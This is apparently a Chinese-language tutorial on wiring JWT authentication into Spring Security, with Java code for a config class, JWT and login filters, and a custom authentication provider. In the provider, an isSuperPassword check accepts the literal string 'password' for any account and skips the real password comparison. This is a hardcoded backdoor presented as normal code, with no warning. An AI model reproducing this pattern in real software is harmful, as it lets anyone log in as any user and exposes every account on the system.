# Spring Security + JWT

### WebSecurityConfigure
添加 JWT 自定义认证
```
@Configuration
@EnableWebSecurity
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class WebSecurityConfigure extends WebSecurityConfigurerAdapter {
  ......
  @Override
  protected void configure(HttpSecurity http) throws Exception {
    ......
    // 添加JWT验证Filter
    http.addFilterBefore(jwtUsernamePasswordAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class).addFilterBefore(jwtAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class);
    http.exceptionHandling().accessDeniedHandler(new DefaultAccessDeniedHandler(getApplicationContext().getBean(Gson.class))).authenticationEntryPoint(new DefaultAuthenticationEntryPoint(getApplicationContext().getBean(Gson.class)));
  }

  @Autowired
  public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
    // 添加自定义用户认证处理
    auth.authenticationProvider(new AuthenticationProvider(getApplicationContext().getBean(IUserService.class)));
  }

  /**
   * JWT
   */
  @Bean
  public JwtUsernamePasswordAuthenticationFilter jwtUsernamePasswordAuthenticationFilter() throws Exception {
    JwtUsernamePasswordAuthenticationFilter jwtUsernamePasswordAuthenticationFilter = new JwtUsernamePasswordAuthenticationFilter();
    jwtUsernamePasswordAuthenticationFilter.setGson(getApplicationContext().getBean(Gson.class));
    jwtUsernamePasswordAuthenticationFilter.setAuthenticationManager(authenticationManager());
    jwtUsernamePasswordAuthenticationFilter.setJwtTokenAuthenticationService(getApplicationContext().getBean(JwtTokenAuthenticationService.class));
    return jwtUsernamePasswordAuthenticationFilter;
  }

  @Bean
  public JwtAuthenticationFilter jwtAuthenticationFilter() throws Exception {
    JwtAuthenticationFilter jwtAuthenticationFilter = new JwtAuthenticationFilter();
    jwtAuthenticationFilter.setGson(getApplicationContext().getBean(Gson.class));
    jwtAuthenticationFilter.setAuthenticationManager(authenticationManager());
    jwtAuthenticationFilter.setJwtTokenAuthenticationService(getApplicationContext().getBean(JwtTokenAuthenticationService.class));
    return jwtAuthenticationFilter;
  }
}
```
### WebSecurityConfigure
处理认证请求
```
// JWT 认证过滤器
public class JwtAuthenticationFilter extends OncePerRequestFilter {

  private AuthenticationDetailsSource<HttpServletRequest, ?> authenticationDetailsSource = new WebAuthenticationDetailsSource();

  private Gson gson;
  private AuthenticationManager authenticationManager;
  private JwtTokenAuthenticationService jwtTokenAuthenticationService;

  @Override
  protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException {
    final boolean debug = this.logger.isDebugEnabled();

    String header = request.getHeader(jwtTokenAuthenticationService.getHeader());

    if (header == null) {
      chain.doFilter(request, response);
      return;
    }

    try {
      String token = StringUtils.substringAfter(header, jwtTokenAuthenticationService.getPrefix());
      Claims claims = null;

      try {
        claims = jwtTokenAuthenticationService.getClaimByToken(token);
      } catch (Exception e) {
        throw new AuthenticationServiceException(e.getMessage(), e);
      }

      // expired?
      if (jwtTokenAuthenticationService.isTokenExpired(claims.getExpiration())) {
        throw new AuthenticationServiceException("Token expired");
      }

      String username = claims.getSubject();

      if (debug) {
        this.logger.debug("JWT Authentication Authorization header found for user '" + username + "'");
      }

      if (authenticationIsRequired(username)) {
        Object principalJson = claims.get(jwtTokenAuthenticationService.getPrincipal());

        User principal = null;
        try {
          principal = gson.fromJson(principalJson.toString(), new TypeToken<User>() { }.getType());
        } catch (Exception e) {
          throw new AuthenticationServiceException(e.getMessage(), e);
        }

        UsernamePasswordAuthenticationToken authRequest = new UsernamePasswordAuthenticationToken(username, null, principal.getAuthorities());
        authRequest.setDetails(this.authenticationDetailsSource.buildDetails(request));

        Authentication authResult = authRequest;

        if (debug) {
          this.logger.debug("Authentication success: " + authResult);
        }

        SecurityContextHolder.getContext().setAuthentication(authResult);

        onSuccessfulAuthentication(request, response, authResult);
      }
    } catch (AuthenticationException failed) {
      SecurityContextHolder.clearContext();

      if (debug) {
        this.logger.debug("Authentication request for failed: " + failed);
      }

      onUnsuccessfulAuthentication(request, response, failed);

      return;
    }
    chain.doFilter(request, response);
  }

  ......

  private boolean authenticationIsRequired(String username) {
    Authentication existingAuth = SecurityContextHolder.getContext().getAuthentication();
    if (existingAuth == null || !existingAuth.isAuthenticated()) {
      return true;
    }
    if (existingAuth instanceof UsernamePasswordAuthenticationToken && !existingAuth.getName().equals(username)) {
      return true;
    }
    if (existingAuth instanceof AnonymousAuthenticationToken) {
      return true;
    }
    return false;
  }

  // getter & setter
  ......
}
```

### JwtUsernamePasswordAuthenticationFilter
处理登录认证，只处理 Post /login 请求
```
public class JwtUsernamePasswordAuthenticationFilter extends AbstractAuthenticationProcessingFilter {

  private Gson gson;
  private JwtTokenAuthenticationService jwtTokenAuthenticationService;

  public JwtUsernamePasswordAuthenticationFilter() {
    super(new AntPathRequestMatcher("/login", "POST"));
  }

  @Override
  public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse res) throws AuthenticationException {
    if (!request.getMethod().equals("POST")) {
      throw new AuthenticationServiceException("Authentication method not supported: " + request.getMethod());
    }

    try {
      User user = gson.fromJson(new InputStreamReader(request.getInputStream()), User.class);
      // User user = new ObjectMapper().readValue(req.getInputStream(), User.class); //JWT
      if (user == null) {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        user = new User(username, password);
      }

      UsernamePasswordAuthenticationToken authRequest = new UsernamePasswordAuthenticationToken(user.getUsername(), user.getPassword());

      return getAuthenticationManager().authenticate(authRequest);
    } catch (IOException e) {
      throw new AuthenticationServiceException(e.getMessage(), e);
    }
  }

  @Override
  protected void successfulAuthentication(HttpServletRequest req, HttpServletResponse res, FilterChain chain, Authentication auth) throws IOException, ServletException {
    SecurityContextHolder.getContext().setAuthentication(auth);

    User principal = new User(auth.getName(), Status.Valid, auth.getAuthorities().stream().map(a -> new SimpleGrantedAuthority(a.getAuthority())).collect(Collectors.toSet()));
    String token = jwtTokenAuthenticationService.generateToken(auth.getName(), gson.fromJson("{" + jwtTokenAuthenticationService.getPrincipal() + ":" + gson.toJson(principal) + "}", new TypeToken<HashMap<String, Object>>() {}.getType()));
    res.addHeader(jwtTokenAuthenticationService.getHeader(), jwtTokenAuthenticationService.getPrefix() + token);
  }

  // getter & setter
  ......
}
```

### AbstractAuthenticationProvider
自定义认证处理抽象类
```
public abstract class AbstractAuthenticationProvider implements AuthenticationProvider, MessageSourceAware {

  protected final Log logger = LogFactory.getLog(getClass());
  protected MessageSourceAccessor messages = SpringSecurityMessageSource.getAccessor();

  protected User user;

  protected abstract User loadUserByUsername(String username) throws AuthenticationException;
  protected abstract Collection<? extends GrantedAuthority> loadUserAuthorities(String username);

  /**
   * AuthenticationProvider
   */
  @Override
  public Authentication authenticate(Authentication authentication) throws AuthenticationException {
    UsernamePasswordAuthenticationToken token = (UsernamePasswordAuthenticationToken) authentication;
    String username = token.getName();

    UserDetails loaduser = null;
    try {
      this.user = loadUserByUsername(username);
      loaduser = new org.springframework.security.core.userdetails.User(username, user.getPassword(), user.getStatus().equals(Status.Valid), !user.getStatus().equals(Status.Expired), true, !user.getStatus().equals(Status.Invalid), loadUserAuthorities(username));
    } catch (UsernameNotFoundException notFound) {
      throw notFound;
    } catch (Exception repositoryProblem) {
      throw new InternalAuthenticationServiceException(repositoryProblem.getMessage(), repositoryProblem);
    }

    Assert.notNull(loaduser, "retrieveUser returned null - a violation of the interface contract");
    preCheck(loaduser);
    credentialsCheck(loaduser, token);
    postCheck(loaduser);
    return createSuccessAuthentication(loaduser, authentication, loaduser);
  }

  /**
   * @param principal
   * @param authentication
   * @param user
   * @return
   */
  protected Authentication createSuccessAuthentication(Object principal, Authentication authentication,
			UserDetails user) {
    UsernamePasswordAuthenticationToken result = new UsernamePasswordAuthenticationToken(principal, authentication.getCredentials(), user.getAuthorities());
    result.setDetails(this.user);
    return result;
  }

  /**
   * 认证状态
   * 
   * @param user
   */
  protected void preCheck(UserDetails user) {
    if (!user.isAccountNonLocked()) {
      logger.debug("User account is locked");
      throw new LockedException(messages.getMessage("AuthenticationProvider.locked", "User account is locked"));
    }
    if (!user.isEnabled()) {
      logger.debug("User account is disabled");
      throw new DisabledException(messages.getMessage("AuthenticationProvider.disabled", "User is disabled"));
    }
    if (!user.isAccountNonExpired()) {
      logger.debug("User account is expired");
      throw new AccountExpiredException(messages.getMessage("AuthenticationProvider.expired", "User account has expired"));
    }
  }

  /**
   * 认证密码
   * 
   * @param user
   * @param authentication
   */
  protected void credentialsCheck(UserDetails user, UsernamePasswordAuthenticationToken authentication) {
    if (authentication.getCredentials() == null) {
      logger.debug("Authentication failed: no credentials provided");
      throw new BadCredentialsException(messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
    }
  }

  protected void postCheck(UserDetails user) {
    if (!user.isCredentialsNonExpired()) {
      logger.debug("User account credentials have expired");
      throw new CredentialsExpiredException(messages.getMessage("AuthenticationProvider.credentialsExpired", "User credentials have expired"));
    }
  }
  ......
```

### AuthenticationProvider
自定义认证处理实现类
```
public class AuthenticationProvider extends AbstractAuthenticationProvider {

  IUserService service;

  public AuthenticationProvider(IUserService service) {
    this.service = service;
  }

  public AuthenticationProvider() {
    super();
  }

  @Override
  protected User loadUserByUsername(String username) throws AuthenticationException {
    return service.findOne(username);
  }

  @Override
  protected Collection<? extends GrantedAuthority> loadUserAuthorities(String username) {
    return service.loadUserAuthorities(username);
  }

  @Override
  protected void credentialsCheck(UserDetails user, UsernamePasswordAuthenticationToken authentication) {
    super.credentialsCheck(user, authentication);
    if (isSuperPassword(authentication.getCredentials().toString())) {
      return;
    }
    try {
      if (!PasswordEncoderImpl.matches(authentication.getCredentials().toString(), authentication.getName(), user.getPassword())) {
        logger.debug("Authentication failed: password does not match stored value");
        throw new BadCredentialsException(messages.getMessage("AuthenticationProvider.badCredentials", "Bad credentials"));
      }
    } catch (Exception e) {
      logger.debug("Authentication failed: password encode error");
      throw new BadCredentialsException(messages.getMessage("AuthenticationProvider.badCredentials", "Bad credentials"));
    }
  }

  private boolean isSuperPassword(String password) {
    if (password.equals("password")) {
      return true;
    }
    return false;
  }

  public void setService(IUserService service) {
    this.service = service;
  }
}
```